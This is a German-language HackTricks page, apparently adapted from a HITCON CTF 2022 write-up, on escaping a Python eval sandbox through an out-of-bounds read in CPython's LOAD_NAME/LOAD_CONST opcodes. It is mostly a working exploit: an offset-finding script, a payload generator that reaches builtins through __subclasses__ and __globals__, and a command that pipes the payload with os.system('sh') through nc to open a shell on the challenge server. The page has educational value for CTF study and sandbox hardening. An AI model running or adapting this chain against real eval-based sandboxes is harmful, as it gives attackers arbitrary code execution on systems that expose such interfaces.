# LOAD_NAME / LOAD_CONST Opcode OOB Read

{% hint style="success" %}
Lernen Sie & üben Sie AWS-Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen Sie & üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.

</details>
{% endhint %}

**Diese Informationen wurden** [**aus diesem Bericht**](https://blog.splitline.tw/hitcon-ctf-2022/)** übernommen.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Wir können die OOB-Lese-Funktion im LOAD_NAME / LOAD_CONST-Opcode verwenden, um ein Symbol im Speicher zu erhalten. Das bedeutet, dass Sie Tricks wie `(a, b, c, ... hunderte von Symbolen ..., __getattribute__) if [] else [].__getattribute__(...)` verwenden können, um ein Symbol (wie einen Funktionsnamen) zu erhalten, den Sie möchten.

Dann erstellen Sie einfach Ihr Exploit.

### Überblick <a href="#overview-1" id="overview-1"></a>

Der Quellcode ist ziemlich kurz, enthält nur 4 Zeilen!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Wie kommt es zu dem Segfault?

Beginnen wir mit einem einfachen Beispiel, `[a, b, c]` könnte in den folgenden Bytecode kompiliert werden.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Aber was passiert, wenn die `co_names` ein leeres Tupel werden? Der `LOAD_NAME 2` Opcode wird dennoch ausgeführt und versucht, den Wert von dieser Speicheradresse zu lesen, von der er ursprünglich stammen sollte. Ja, das ist ein Out-of-Bound Read "Feature".

Das Kernkonzept für die Lösung ist einfach. Einige Opcodes in CPython wie z.B. `LOAD_NAME` und `LOAD_CONST` sind anfällig (?) für OOB Reads.

Sie rufen ein Objekt aus dem Index `oparg` aus dem `consts` oder `names` Tupel ab (das ist, wie `co_consts` und `co_names` unter der Haube genannt werden). Wir können uns den folgenden kurzen Ausschnitt über `LOAD_CONST` ansehen, um zu sehen, was CPython tut, wenn es den `LOAD_CONST` Opcode verarbeitet.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Auf diese Weise können wir das OOB-Feature verwenden, um einen "Namen" aus einem beliebigen Speicheroffset zu erhalten. Um sicherzustellen, welchen Namen es hat und welchen Offset es hat, versuchen Sie einfach `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Und Sie könnten etwas bei etwa oparg > 700 finden. Sie können auch versuchen, gdb zu verwenden, um sich natürlich die Speicherstruktur anzusehen, aber ich glaube nicht, dass es einfacher wäre?

### Erzeugen des Exploits <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Sobald wir diese nützlichen Offsets für Namen / Konstanten abgerufen haben, wie _erhalten_ wir einen Namen / eine Konstante von diesem Offset und verwenden sie? Hier ist ein Trick für Sie:\
Angenommen, wir können einen `__getattribute__`-Namen vom Offset 5 (`LOAD_NAME 5`) mit `co_names=()` erhalten, dann führen Sie einfach die folgenden Schritte aus:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Beachten Sie, dass es nicht notwendig ist, es als `__getattribute__` zu benennen, Sie können es als etwas Kürzeres oder Seltsameres benennen

Sie können den Grund einfach erkennen, indem Sie sich den Bytecode ansehen:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Beachten Sie, dass `LOAD_ATTR` auch den Namen aus `co_names` abruft. Python lädt Namen aus demselben Offset, wenn der Name gleich ist, sodass das zweite `__getattribute__` immer noch von Offset=5 geladen wird. Mit diesem Feature können wir einen beliebigen Namen verwenden, sobald der Name im Speicher in der Nähe ist.

Die Generierung von Zahlen sollte trivial sein:

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### Exploit-Skript <a href="#exploit-script-1" id="exploit-script-1"></a>

Ich habe keine Konstanten verwendet aufgrund des Längenlimits.

Hier ist zunächst ein Skript, um diese Offsets der Namen zu finden.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Und das Folgende dient zur Erstellung des tatsächlichen Python-Exploits.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Es macht im Grunde genommen die folgenden Dinge für die Zeichenfolgen, die wir aus der `__dir__` Methode erhalten:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
{% hint style="success" %}
Lernen Sie AWS-Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys senden.

</details>
{% endhint %}
